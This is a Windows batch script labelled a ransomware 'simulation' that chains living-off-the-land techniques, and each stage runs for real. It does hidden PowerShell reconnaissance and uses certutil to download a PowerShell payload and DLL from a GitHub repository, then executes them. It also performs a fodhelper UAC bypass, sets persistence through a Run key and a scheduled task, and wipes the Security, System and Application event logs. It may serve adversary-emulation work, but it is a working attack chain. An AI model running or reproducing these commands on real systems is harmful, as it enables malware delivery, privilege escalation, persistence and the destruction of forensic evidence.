@echo off
setlocal ENABLEEXTENSIONS
color 0c
title NSFW-Ransomware Simulation via LOLBAS

echo [*] Starting NSFW-Ransomware Simulation...
echo.

REM === Stage 0: Remote Staging Directory ===
set "stageDir=%TEMP%\NSFW"
if not exist "%stageDir%" mkdir "%stageDir%"
cd /d "%stageDir%"

REM === Stage 1: Recon via PowerShell (LOLBAS)
echo [+] System & Network Discovery
powershell -nop -w hidden -Command "tasklist /v | Out-File .\proc_list.txt"
powershell -nop -w hidden -Command "systeminfo | Out-File .\sysinfo.txt"
powershell -nop -w hidden -Command "net view | Out-File .\netshares.txt"
powershell -nop -w hidden -Command "nltest /domain_trusts | Out-File .\domain_trusts.txt"

REM === Stage 2: Download PowerShell Payload (Direct .ps1 from GitHub)
echo [+] Downloading nsfw_inject.ps1 from GitHub
set "decodedPS=nsfw_inject.ps1"
certutil -urlcache -split -f "https://raw.githubusercontent.com/P1rat3L00t/NSFW-Ransomware/main/payloads/nsfw_inject.ps1" "%decodedPS%"

REM === Stage 3: Download DLL for Reflective Injection
echo [+] Downloading nsfw.dll from GitHub
set "dllPath=nsfw.dll"
certutil -urlcache -split -f "https://raw.githubusercontent.com/P1rat3L00t/NSFW-Ransomware/main/payloads/dll/x64/Release/nsfw.dll" "%dllPath%"

REM === Stage 4: Execute PowerShell Script Payload
echo [+] Executing payload (nsfw_inject.ps1)
powershell -nop -w hidden -ExecutionPolicy Bypass -File "%decodedPS%"

REM === Stage 5: Reflective DLL Injection using rundll32
echo [+] Executing DLL via rundll32 (requires valid export e.g. DllEntry)
rundll32 "%cd%\%dllPath%",DllEntry

REM === Stage 6: Simulate UAC Bypass via fodhelper
echo [+] Simulating UAC Bypass (fodhelper)
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "\"%cd%\%decodedPS%\"" /f >nul
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v "DelegateExecute" /f >nul
start fodhelper.exe
timeout /t 5 >nul
reg delete HKCU\Software\Classes\ms-settings /f >nul

REM === Stage 7: Persistence via Run Key + Scheduled Task
echo [+] Setting persistence via registry & schtasks
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v NSFW /d "powershell -nop -w hidden -ExecutionPolicy Bypass -File %cd%\%decodedPS%" /f >nul
schtasks /Create /SC DAILY /TN "NSFW-Ransom" /TR "powershell -nop -w hidden -ExecutionPolicy Bypass -File %cd%\%decodedPS%" /ST 23:59 /F >nul

REM === Stage 8: Wipe Event Logs
echo [+] Wiping Windows Event Logs (simulation)
wevtutil cl Application
wevtutil cl Security
wevtutil cl System

REM === Stage 9: Cleanup (Optional)
echo [+] Cleaning temporary payloads (keeping persistent loader)
:: del "%decodedPS%" >nul
:: del "%dllPath%" >nul
echo [+] Payloads remain in: %stageDir% for persistence

echo.
echo [✔] NSFW-Ransomware simulation completed.
pause
endlocal
